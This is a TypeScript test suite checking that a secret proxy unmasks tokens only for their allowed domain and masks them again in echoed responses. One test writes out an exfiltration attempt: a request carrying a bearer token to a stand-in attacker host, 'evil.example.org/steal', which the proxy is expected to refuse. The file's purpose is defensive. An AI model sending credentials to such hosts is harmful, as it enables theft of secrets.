import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import type { Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import express from 'express';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { registerFetchProxyRoute } from '../../../../../node-server/src/routes/fetch-proxy.js';
import { EnvSecretStore } from '../../../../../node-server/src/secrets/env-secret-store.js';
import { SecretProxyManager } from '../../../../../node-server/src/secrets/proxy-manager.js';
import { readOrCreateSessionId } from '../../../../../node-server/src/secrets/session-id-file.js';
import { proxiedFetchTransport } from '../../../../src/kernel/wasm-realm/net/fetch-transport.js';
import { RealmProxy } from '../../../../src/kernel/wasm-realm/net/proxy-service.js';
import { LoopbackNet } from '../../../../src/kernel/wasm-realm/socket.js';
import { setLocalApiBaseUrl } from '../../../../src/shell/proxied-fetch.js';
import { Client } from './proxy-helpers.js';

const REAL = 'ghp_realSecretValue0123456789abcdefXYZ';

let dir: string;
let server: Server;
let masked: string;
let proxy: RealmProxy;
let net: LoopbackNet;
const upstreamSaw: Array<{ url: string; authorization: string | null; body: string }> = [];

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), 'slicc-realm-secrets-'));
  writeFileSync(join(dir, 'secrets.env'), `TOKEN=${REAL}\nTOKEN_DOMAINS=api.example.test\n`);
  const secretProxy = new SecretProxyManager(
    new EnvSecretStore(join(dir, 'secrets.env')),
    readOrCreateSessionId(dir)
  );
  await secretProxy.reload();
  const entry = secretProxy.getMaskedEntries().find((e) => e.name === 'TOKEN');
  masked = entry?.maskedValue ?? '';
  expect(masked).not.toBe('');
  expect(masked).not.toBe(REAL);

  const app = express();
  const silent = { log: () => undefined, warn: () => undefined, error: () => undefined };
  registerFetchProxyRoute(app, { secretProxy, logger: silent });
  server = await new Promise<Server>((resolve) => {
    const s = app.listen(0, '127.0.0.1', () => resolve(s));
  });
  const bridge = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  setLocalApiBaseUrl(bridge);

  const realFetch = globalThis.fetch;
  vi.spyOn(globalThis, 'fetch').mockImplementation(async (input, init) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
    if (url.startsWith(bridge)) return realFetch(input, init);
    const headers = new Headers(init?.headers);
    const body = init?.body ? await new Response(init.body).text() : '';
    upstreamSaw.push({ url, authorization: headers.get('authorization'), body });
    return new Response(`you sent ${headers.get('authorization')} and ${body}`, {
      status: 200,
      headers: { 'content-type': 'text/plain', 'x-echo': headers.get('authorization') ?? '' },
    });
  });

  net = new LoopbackNet();
  proxy = new RealmProxy({ net, transport: proxiedFetchTransport() });
});

afterAll(async () => {
  proxy?.close();
  await proxy?.closed;
  vi.restoreAllMocks();
  setLocalApiBaseUrl(null);
  await new Promise((resolve) => server?.close(resolve));
  rmSync(dir, { recursive: true, force: true });
});

describe('realm proxy secret boundary (CLI route)', () => {
  it('unmasks a masked Authorization only at egress and masks the echo on the way back', async () => {
    const c = Client.open(net, proxy.port);
    await c.send(
      `GET http://api.example.test/echo HTTP/1.1\r\nHost: api.example.test\r\nAuthorization: Bearer ${masked}\r\n\r\n`
    );
    const res = await c.response();
    expect(upstreamSaw.at(-1)).toMatchObject({
      url: 'http://api.example.test/echo',
      authorization: `Bearer ${REAL}`,
    });
    expect(res.status).toBe(200);
    expect(res.body).toBe(`you sent Bearer ${masked} and `);
    expect(res.header('x-echo')).toBe(`Bearer ${masked}`);
    const wire = JSON.stringify(res);
    expect(wire).not.toContain(REAL);
    c.close();
  });

  it('unmasks a masked token in a request body (buffered upload path) and masks its echo', async () => {
    const c = Client.open(net, proxy.port);
    const body = `token=${masked}`;
    await c.send(
      `POST http://api.example.test/form HTTP/1.1\r\nContent-Type: text/plain\r\nContent-Length: ${body.length}\r\n\r\n${body}`
    );
    const res = await c.response();
    expect(upstreamSaw.at(-1)?.body).toBe(`token=${REAL}`);
    expect(res.body).toBe(`you sent null and token=${masked}`);
    expect(JSON.stringify(res)).not.toContain(REAL);
    c.close();
  });

  it('refuses a masked token bound for another domain, and the error names no value', async () => {
    const before = upstreamSaw.length;
    const c = Client.open(net, proxy.port);
    await c.send(
      `GET http://evil.example.org/steal HTTP/1.1\r\nAuthorization: Bearer ${masked}\r\n\r\n`
    );
    const res = await c.response();
    expect(res.status).toBe(502);
    expect(res.body).toContain('Secret "TOKEN" is not allowed for domain "evil.example.org"');
    expect(JSON.stringify(res)).not.toContain(REAL);
    expect(upstreamSaw.length).toBe(before);
    c.close();
  });
});
